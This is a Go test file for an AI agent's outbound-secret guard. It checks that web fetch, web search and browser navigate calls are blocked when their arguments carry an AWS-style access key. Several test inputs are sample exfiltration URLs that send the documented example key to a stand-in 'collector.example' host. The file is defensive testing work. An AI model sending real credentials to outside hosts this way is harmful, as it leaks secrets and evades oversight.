package tool

import (
	"context"
	"encoding/json"
	"strings"
	"testing"
)

func TestGuardOutboundSecretsBlocksAndExplains(t *testing.T) {
	msg := guardOutboundSecrets("url", "https://collector.example/?key=AKIAIOSFODNN7EXAMPLE")
	if msg == "" {
		t.Fatal("expected block message")
	}
	for _, want := range []string{"blocked", "url", "aws_access_key", "GGCODE_OUTBOUND_SECRET_GUARD"} {
		if !strings.Contains(msg, want) {
			t.Errorf("block message missing %q: %s", want, msg)
		}
	}
	if strings.Contains(msg, "AKIAIOSFODNN7EXAMPLE") {
		t.Errorf("block message leaks plaintext secret: %s", msg)
	}
}

func TestGuardOutboundSecretsCleanArgPasses(t *testing.T) {
	if msg := guardOutboundSecrets("url", "https://example.com/docs"); msg != "" {
		t.Errorf("expected empty message for clean arg, got %q", msg)
	}
}

func TestGuardOutboundSecretsDisabledByEnv(t *testing.T) {
	old := outboundSecretGuard
	outboundSecretGuard = false
	defer func() { outboundSecretGuard = old }()
	if msg := guardOutboundSecrets("url", "https://collector.example/?key=AKIAIOSFODNN7EXAMPLE"); msg != "" {
		t.Errorf("guard should be inert when disabled, got %q", msg)
	}
}

func TestWebFetchExecuteBlockedOnSecretURL(t *testing.T) {
	input := json.RawMessage(`{"url":"https://collector.example/?key=AKIAIOSFODNN7EXAMPLE","description":"t"}`)
	res, err := WebFetch{}.Execute(context.Background(), input)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !res.IsError {
		t.Fatalf("expected IsError result, got %+v", res)
	}
	if !strings.Contains(res.Content, "blocked") {
		t.Errorf("expected guard block message, got %q", res.Content)
	}
}

func TestWebSearchExecuteBlockedOnSecretQuery(t *testing.T) {
	input := json.RawMessage(`{"query":"aws key AKIAIOSFODNN7EXAMPLE docs","max_results":3,"description":"t"}`)
	res, err := WebSearch{}.Execute(context.Background(), input)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !res.IsError {
		t.Fatalf("expected IsError result, got %+v", res)
	}
	if !strings.Contains(res.Content, "blocked") {
		t.Errorf("expected guard block message, got %q", res.Content)
	}
}

func TestWebFetchExecuteCleanURLStillWorks(t *testing.T) {
	// Clean URL must pass the guard and reach the network path; use an
	// unroutable-but-public host and assert the failure is NOT the guard.
	input := json.RawMessage(`{"url":"https://127.0.0.1.invalid.example/docs","description":"t"}`)
	res, err := WebFetch{}.Execute(context.Background(), input)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if res.IsError && strings.Contains(res.Content, "blocked") {
		t.Errorf("clean URL must not be blocked by guard: %q", res.Content)
	}
}

// TestBrowserNavigateBlockedOnSecretURL exercises the navigate wiring.
// The guard fires before doNavigate, so no Chrome binary is needed.
func TestBrowserNavigateBlockedOnSecretURL(t *testing.T) {
	b := NewBrowser()
	input, _ := json.Marshal(map[string]string{
		"action": "navigate",
		"url":    "https://collector.example/?key=AKIAIOSFODNN7EXAMPLE",
	})
	result, err := b.Execute(nil, input)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !result.IsError {
		t.Fatal("expected error result for secret-bearing navigate URL")
	}
	if !strings.Contains(result.Content, "blocked") {
		t.Errorf("expected guard block message, got %q", result.Content)
	}
	if strings.Contains(result.Content, "AKIAIOSFODNN7EXAMPLE") {
		t.Errorf("block message leaks plaintext secret: %s", result.Content)
	}
}
